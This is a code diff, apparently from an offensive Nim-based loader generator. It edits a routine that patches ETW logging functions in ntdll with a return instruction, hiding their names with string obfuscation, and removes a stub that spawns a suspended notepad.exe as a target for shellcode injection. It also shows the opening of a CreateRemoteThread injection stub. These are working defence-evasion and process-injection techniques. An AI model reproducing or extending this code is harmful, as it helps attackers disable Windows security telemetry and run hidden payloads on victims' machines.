@@ -487,7 +487,8 @@ proc Patchntdll(): bool =
         op: ULONG
         t: ULONG
         disabled: bool = false
-        PatchAPIs: seq[string] = @[obf("EtwNotificationRegister"), obf("EtwEventRegister"), obf("EtwEventWriteFull"), obf("EtwEventWrite")]
+        # two of the functions cause problems for --csharp and --syswhispers --jump at the moment
+        PatchAPIs: seq[string] = @[#[obf("EtwNotificationRegister"),]# #[obf("EtwEventRegister"),]# obf("EtwEventWriteFull"), obf("EtwEventWrite")]
 
     when defined amd64:
         let patch: array[1, byte] = [byte 0xc3]
@@ -1002,18 +1003,6 @@ when isMainModule:
 
 """
 
-
-let NotepadProcIDStub * = """
-
-# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
-let tProcess = startProcess(obf("notepad.exe"))
-tProcess.suspend() # That's handy!
-tProcess.close()
-
-echo obf("[*] Target Process: "), tProcess.processID
-var remoteProcID = DWORD(tProcess.processID)
-
-"""
 
 let ShellcoderemoteinjectStub_notepad * = """
 proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
